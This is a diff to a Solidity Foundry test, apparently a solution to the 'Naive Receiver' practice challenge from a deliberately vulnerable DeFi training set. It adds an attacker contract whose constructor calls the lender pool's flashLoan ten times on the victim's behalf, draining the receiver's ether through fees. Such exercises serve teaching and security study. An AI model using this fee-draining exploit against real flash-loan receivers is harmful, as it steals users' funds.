@@ -50,6 +50,11 @@ contract NaiveReceiver is Test {
     function testExploit() public {
         /** EXPLOIT START **/
 
+        new NaiveReceiverAttacker(
+            address(flashLoanReceiver),
+            payable(naiveReceiverLenderPool)
+        );
+
         /** EXPLOIT END **/
         validation();
     }
@@ -61,5 +66,13 @@ contract NaiveReceiver is Test {
             address(naiveReceiverLenderPool).balance,
             ETHER_IN_POOL + ETHER_IN_RECEIVER
         );
+    }
+}
+
+contract NaiveReceiverAttacker {
+    constructor(address victim, address payable pool) {
+        for (uint256 i = 0; i < 10; i++) {
+            NaiveReceiverLenderPool(pool).flashLoan(victim, 0);
+        }
     }
 }
